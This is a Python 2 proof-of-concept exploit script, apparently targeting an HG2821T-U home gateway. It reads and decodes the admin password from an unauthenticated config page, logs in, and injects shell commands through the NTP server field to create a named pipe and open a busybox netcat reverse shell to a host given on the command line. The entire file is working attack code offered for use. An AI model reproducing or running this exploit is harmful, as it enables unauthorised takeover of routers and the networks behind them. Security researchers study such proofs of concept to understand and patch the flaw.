#coding=utf-8
#author Levi4than

import requests
import json
import sys

decodeDict = {
    "48":"0",
    "49":"1",
    "50":"2",
    "51":"3",
    "52":"4",
    "53":"5",
    "54":"6",
    "55":"7",
    "56":"8",
    "57":"9",
    "65":"W",
    "66":"X",
    "67":"Y",
    "68":"Z",
    "69":"A",
    "70":"B",
    "71":"C",
    "72":"D",
    "73":"E",
    "74":"F",
    "75":"G",
    "76":"H",
    "77":"I",
    "78":"J",
    "79":"K",
    "80":"L",
    "81":"M",
    "82":"N",
    "83":"O",
    "84":"P",
    "85":"Q",
    "86":"R",
    "87":"S",
    "88":"T",
    "89":"U",
    "90":"V",
    "97":"w",
    "98":"x",
    "99":"y",
    "100":"z",
    "101":"a",
    "102":"b",
    "103":"c",
    "104":"d",
    "105":"e",
    "106":"f",
    "107":"g",
    "108":"h",
    "109":"i",
    "110":"j",
    "111":"k",
    "112":"l",
    "113":"m",
    "114":"n",
    "115":"o",
    "116":"p",
    "117":"q",
    "118":"r",
    "119":"s",
    "120":"t",
    "121":"u",
    "122":"v"
}

def decodePass(encodeStr):
    encodeStrArr = encodeStr.split("&")
    decodeStr = ""
    for i in range(0, len(encodeStrArr)-1, 1):
       decodeStr = decodeStr + decodeDict[encodeStrArr[i]]
    return decodeStr

def login(gwURL, reverses):

    logURL = gwURL + "/cgi-bin/login.htm.cgi"
    infoPage = gwURL + '/cgi-bin/baseinfoSet.cgi'
    try:
        pagesource = requests.get(infoPage, timeout=5).content
    except:
        print '[-] maybe time out'
    encodePassword = json.loads(pagesource)["BASEINFOSET"]["baseinfoSet_TELECOMPASSWORD"]
    telecom_password = decodePass(encodePassword)

    data = {
        "user_name":"telecomadmin",
        "password":telecom_password
    }
    session = requests.session()
    session.proxies = {"http":"http://127.0.0.1:8080"}
    loginContent = session.post(logURL, data=data, timeout=5).content
    if 'index_main' in loginContent:
        poc(session, reverses, gwURL)
    else:
        print '[-] maybe password wrong'

def poc(session, reverses, gwURL):

    exploitPage = gwURL + "/cgi-bin/sntpcfg.cgi"
    header = {"Content-Type": "text/xml"}
    data1 = {
        "ntp_enabled":"1",
        "ntpservertype":"0",
        "ntpinterval":"86400",
        "ntpServer1":"||mknod /tmp/backpipe p"
    }
    data2 = {
        "ntp_enabled":"1",
        "ntpservertype":"0",
        "ntpinterval":"86400",
        "ntpServer1":"||/bin/sh 0</tmp/backpipe | busybox nc " + reverses[0] + " " + reverses[1] + " 1>/tmp/backpipe"
    }

    try:
        status = session.post(exploitPage, headers=header, data=data1, timeout=10).status_code
        if status != 200:
            print '[-] maybe this function doesnt exist or session expires'
        else:
            session.post(exploitPage, headers=header, data=data2, timeout=15)
            print '[+] check your shell'
    except:
        print '[-] maybe get stuck,try later'


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print '[-] wrong format'
        print 'example: python HG2821T-U_PoC.py http://192.168.1.1:8080 123.123.123.123:1234'
    else:
        gwURL = sys.argv[1]
        reverse = sys.argv[2]
        try:
            requests.get(gwURL, timeout=10)
            reverses = reverse.split(":")
            login(gwURL, reverses)
        except Exception, e:
            print e
            print '[-] target doesnt exist or reverse address wrong'

